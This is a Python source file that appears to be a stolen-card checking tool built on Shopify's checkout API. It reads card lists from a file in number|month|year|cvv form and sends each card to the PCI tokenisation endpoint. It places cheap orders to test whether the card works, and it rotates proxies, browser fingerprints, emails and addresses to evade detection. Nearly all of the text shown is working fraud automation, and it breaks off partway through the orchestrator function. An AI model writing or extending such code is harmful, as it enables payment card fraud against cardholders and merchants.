
def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"

def extract_rejected_totals(submit_json: str) -> Tuple[str, str]:
    """Corrected checkout total + tax reported by Shopify when a submitted
    proposal does not cover the full amount due. Returns ("", "") if absent."""
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        total = ""
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                total = val
                break
        tax = (seller.get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {})
                    .get("amount", ""))
        return total, tax
    except Exception:
        return "", ""

def extract_pending_poll_delay(submit_body: str, default: float = 1.2) -> float:
    """Best-effort delay (seconds) to honour when Shopify reports
    WAITING_PENDING_TERMS before accepting the updated seller terms."""
    for pat in (r'"pollDelay"\s*:\s*(\d+)',
                r'"progressiveRatesEstimatedTimeUntilCompletion"\s*:\s*(\d+)'):
        m = re.search(pat, submit_body)
        if m:
            try:
                return max(0.0, min(int(m.group(1)) / 1000.0, 3.0))
            except (TypeError, ValueError):
                break
    return default

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""

def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)

# ──────────────────────── Payload helpers ────────────────────────────

_RE_PATCH_CURRENCY_CODE = re.compile(r'"currencyCode"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_PRESENTMENT   = re.compile(r'"presentmentCurrency"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_COUNTRY_CODE  = re.compile(r'"countryCode"\s*:\s*"[A-Z]{2}"')
_RE_PATCH_PHONE_COUNTRY = re.compile(r'"phoneCountryCode"\s*:\s*"[A-Z]{2}"')

def patch_payload(payload: str, currency: str, country: str) -> str:
    """
    Replace every hard-coded currency/country token in a JSON string.
    Mirrors app.go patchPayload exactly — must be called AFTER json.dumps().
    This is what lets AUD/CAD/GBP-only shops complete a checkout instead of
    returning BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED.
    """
    payload = _RE_PATCH_CURRENCY_CODE.sub(f'"currencyCode": "{currency}"', payload)
    payload = _RE_PATCH_PRESENTMENT.sub(f'"presentmentCurrency": "{currency}"', payload)
    payload = _RE_PATCH_COUNTRY_CODE.sub(f'"countryCode": "{country}"', payload)
    payload = _RE_PATCH_PHONE_COUNTRY.sub(f'"phoneCountryCode": "{country}"', payload)
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "", impersonate: str = "chrome150") -> Tuple[int, str]:

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate=impersonate) as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        status, body = 0, ""
        for attempt in range(3):
            resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
                                data=payload, headers=headers, timeout=12)
            status, body = resp.status_code, resp.text
            if 200 <= status < 300:
                break
            time.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
    return status, body

# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }

# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token

    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text

def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               tax_amount: str = None,
                               total_any: bool = False) -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    if is_digital or total_any:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital or total_any:
        amount_line = '"amount": {"any": true}'
    else:
        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          {amount_line}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Error checking ─────────────────────────────

def check_submit_errors(status: int, body: str):
    if status != 200:
        match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
        if match:
            typename = match.group(1)
            if typename != "SubmitSuccess":
                errors = re.findall(r'"code"\s*:\s*"([^"]+)"', body)
                raise Exception(f"Submit failed with {typename}: {errors if errors else 'Unknown error'}")
        else:
            error_msg = extract_any_error(body)
            if error_msg:
                raise Exception(f"Submit error: {error_msg}")
            else:
                raise Exception(f"Submit returned non-200 status: {status}")

# ──────────────────────── Card and proxy helpers ──────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    if card_year < 100:      # normalise 2-digit year ("29" -> 2029)
        card_year += 2000

    return card_parts[0], card_month, card_year, card_parts[3]

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")

    # Normalize common alternate separators: "host+port", "host port",
    # "user:pass host port" -> colon form (curl treats '+'/' ' as junk).
    p = p.replace('+', ':').replace(' ', ':')

    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4 and '@' not in p:
            # user:pass:host:port -> http://user:pass@host:port
            p = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            p = "http://" + p

    parsed = urllib.parse.urlparse(p)
    host = (parsed.hostname or "").strip()
    if not parsed.netloc or not host:
        raise Exception(f"invalid proxy format: {raw}")
    if '.' not in host and host != 'localhost':
        raise Exception(f"invalid proxy host: {raw}")

    return p

# ──────────────────────── Orchestrator ───────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Enhanced version with random browser fingerprints and addresses"""
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    
    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR
    )
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    # Generate random email for this checkout
    email = generate_random_email()
    
    # Random browser fingerprint for each attempt
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = PROFILE_UA.get(impersonate) or random.choice(USER_AGENTS)
    
    # Create TLS client with curl_cffi
    client = TLSClient(timeout=12, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        currency, country = fetch_shop_currency_sync(client, shop_url)
        result.currency = currency
        # Step 0 - Find cheapest product (0.01$ to 20$): all pages in parallel
        try:
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url
            )
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
